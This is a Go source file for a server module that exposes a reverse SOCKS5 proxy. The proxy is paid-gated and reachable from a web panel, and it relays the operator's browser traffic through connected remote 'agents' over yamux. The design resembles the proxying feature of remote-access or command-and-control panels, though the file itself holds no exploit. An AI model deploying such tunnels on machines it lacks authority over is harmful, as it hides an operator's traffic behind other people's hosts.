package socks5

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"github.com/hashicorp/yamux"

	"agentmanager/modules/config"
	"agentmanager/modules/logger"
	"agentmanager/modules/panelapp"
)

type tunnelSession struct {
	session *yamux.Session
}

type Manager struct {
	mu        sync.Mutex
	sessions  map[string]*tunnelSession
	listeners map[string]*net.Listener
	nextPort  int
	freePorts []int
	usedPorts map[string]int
}

var mgr = &Manager{
	sessions:  make(map[string]*tunnelSession),
	listeners: make(map[string]*net.Listener),
	nextPort:  25000,
	usedPorts: make(map[string]int),
}

func randomToken(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return base64.RawURLEncoding.EncodeToString(b)
}

func HandleTunnel(agentID string, conn net.Conn) {
	cfg := yamux.DefaultConfig()
	cfg.LogOutput = io.Discard
	session, err := yamux.Server(conn, cfg)
	if err != nil {
		logger.Errorf("[socks5] yamux server failed for %s: %v", agentID, err)
		conn.Close()
		return
	}
	logger.Infof("[socks5] tunnel up for agent %s", agentID)

	mgr.mu.Lock()
	if old, ok := mgr.sessions[agentID]; ok {
		old.session.Close()
	}
	mgr.sessions[agentID] = &tunnelSession{session: session}
	mgr.mu.Unlock()

	<-session.CloseChan()
	logger.Infof("[socks5] tunnel closed for agent %s", agentID)

	mgr.mu.Lock()
	if ts, ok := mgr.sessions[agentID]; ok && ts.session == session {
		delete(mgr.sessions, agentID)
	}
	mgr.mu.Unlock()
}

func (m *Manager) allocPort(agentID string) int {
	m.mu.Lock()
	defer m.mu.Unlock()
	if p, ok := m.usedPorts[agentID]; ok {
		return p
	}
	if len(m.freePorts) > 0 {
		p := m.freePorts[len(m.freePorts)-1]
		m.freePorts = m.freePorts[:len(m.freePorts)-1]
		m.usedPorts[agentID] = p
		return p
	}
	if m.nextPort > 35000 {
		return 0
	}
	p := m.nextPort
	m.nextPort++
	m.usedPorts[agentID] = p
	return p
}

func (m *Manager) freePort(agentID string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if _, ok := m.usedPorts[agentID]; !ok {
		return
	}
	p := m.usedPorts[agentID]
	delete(m.usedPorts, agentID)
	m.freePorts = append(m.freePorts, p)
	if ln, ok := m.listeners[agentID]; ok {
		(*ln).Close()
		delete(m.listeners, agentID)
	}
}

type Service struct {
	app *panelapp.App
}

func NewService(app *panelapp.App) *Service {
	s := &Service{app: app}
	app.Panel.RegisterHandler("socks5_start", app.Guarded(app.Paid(s.onSocks5Start)))
	app.Panel.RegisterHandler("socks5_stop", app.Guarded(s.onSocks5Stop))
	app.Panel.RegisterHandler("socks5_get", app.Guarded(s.onSocks5Get))
	return s
}

func (m *Manager) start(s *Service, agentID, ownerID string) {
	m.mu.Lock()
	_, hasSession := m.sessions[ownerID]
	_, alreadyListening := m.listeners[agentID]
	m.mu.Unlock()

	if !hasSession {
		logger.Errorf("[socks5] agent %s has no tunnel", agentID)
		return
	}
	if alreadyListening {
		logger.Infof("[socks5] agent %s already has proxy running, re-sending active", agentID)
		m.mu.Lock()
		port := m.usedPorts[agentID]
		m.mu.Unlock()
		host := config.PublicHost()
		if host == "" {
			host = "127.0.0.1"
		}
		for _, panelConn := range s.app.Sess.Subscribers("socks5:" + agentID) {
			s.app.Panel.EmitTo(panelConn, "socks5_active", map[string]interface{}{
				"agent_id":  agentID,
				"host":      host,
				"port":      port,
				"proxy_url": fmt.Sprintf("socks5://%s:%d", host, port),
			})
		}
		return
	}

	port := m.allocPort(agentID)
	if port == 0 {
		return
	}

	addr := fmt.Sprintf("0.0.0.0:%d", port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		m.freePort(agentID)
		return
	}

	m.mu.Lock()
	m.listeners[agentID] = &ln
	m.mu.Unlock()

	host := config.PublicHost()
	if host == "" {
		host = "127.0.0.1"
	}
	proxyURL := fmt.Sprintf("socks5://%s:%d", host, port)

	for _, panelConn := range s.app.Sess.Subscribers("socks5:" + agentID) {
		s.app.Panel.EmitTo(panelConn, "socks5_active", map[string]interface{}{
			"agent_id":  agentID,
			"host":      host,
			"port":      port,
			"proxy_url": proxyURL,
		})
	}

	logger.Infof("[socks5] proxy on %s for agent %s", addr, agentID)
	go m.acceptFirefox(agentID, ownerID, ln)
}

func (m *Manager) acceptFirefox(agentID, ownerID string, ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		go m.handleFirefox(agentID, ownerID, conn)
	}
}

func (m *Manager) handleFirefox(agentID, ownerID string, ffConn net.Conn) {
	defer ffConn.Close()

	m.mu.Lock()
	ts, ok := m.sessions[ownerID]
	m.mu.Unlock()
	if !ok {
		logger.Errorf("[socks5] no tunnel session for agent %s", agentID)
		return
	}

	stream, err := ts.session.Open()
	if err != nil {
		logger.Errorf("[socks5] yamux open failed: %v", err)
		return
	}
	defer stream.Close()

	done := make(chan struct{}, 2)
	go func() { io.Copy(stream, ffConn); done <- struct{}{} }()
	go func() { io.Copy(ffConn, stream); done <- struct{}{} }()
	<-done
}

func (s *Service) onSocks5Get(panelConnID string, payload json.RawMessage) {
	var p struct {
		AgentID string `json:"agent_id"`
	}
	if json.Unmarshal(payload, &p) != nil || p.AgentID == "" {
		return
	}
	s.app.Sess.Subscribe(panelConnID, "socks5:"+p.AgentID)

	mgr.mu.Lock()
	port, hasPort := mgr.usedPorts[p.AgentID]
	mgr.mu.Unlock()

	if hasPort {
		host := config.PublicHost()
		if host == "" {
			host = "127.0.0.1"
		}
		s.app.Panel.EmitTo(panelConnID, "socks5_active", map[string]interface{}{
			"agent_id":  p.AgentID,
			"host":      host,
			"port":      port,
			"proxy_url": fmt.Sprintf("socks5://%s:%d", host, port),
		})
	}
}

func (s *Service) onSocks5Start(panelConnID string, payload json.RawMessage) {
	var p struct {
		AgentID string `json:"agent_id"`
	}
	if json.Unmarshal(payload, &p) != nil || p.AgentID == "" {
		return
	}
	s.app.Sess.Subscribe(panelConnID, "socks5:"+p.AgentID)

	ownerID, ok := s.app.Reg.OwnerOf(p.AgentID)
	if !ok || ownerID == "" {
		logger.Errorf("[socks5] no owner for agent %s", p.AgentID)
		return
	}

	for _, conn := range s.app.Reg.ConnsFor(p.AgentID) {
		s.app.Agent.EmitTo(conn, "socks5_start", nil)
		break
	}

	go func() {
		for i := 0; i < 20; i++ {
			mgr.mu.Lock()
			_, ok := mgr.sessions[ownerID]
			mgr.mu.Unlock()
			if ok {
				mgr.start(s, p.AgentID, ownerID)
				return
			}
			time.Sleep(500 * time.Millisecond)
		}
		logger.Errorf("[socks5] agent %s tunnel never connected", p.AgentID)
	}()
}

func (s *Service) onSocks5Stop(panelConnID string, payload json.RawMessage) {
	var p struct {
		AgentID string `json:"agent_id"`
	}
	if json.Unmarshal(payload, &p) != nil || p.AgentID == "" {
		return
	}
	topic := "socks5:" + p.AgentID
	inactive := map[string]interface{}{"agent_id": p.AgentID}
	s.app.Panel.EmitTo(panelConnID, "socks5_inactive", inactive)
	s.app.Sess.Unsubscribe(panelConnID, topic)
	mgr.freePort(p.AgentID)
	for _, conn := range s.app.Reg.ConnsFor(p.AgentID) {
		s.app.Agent.EmitTo(conn, "socks5_stop", nil)
	}
	for _, panelConn := range s.app.Sess.Subscribers(topic) {
		s.app.Panel.EmitTo(panelConn, "socks5_inactive", inactive)
	}
}
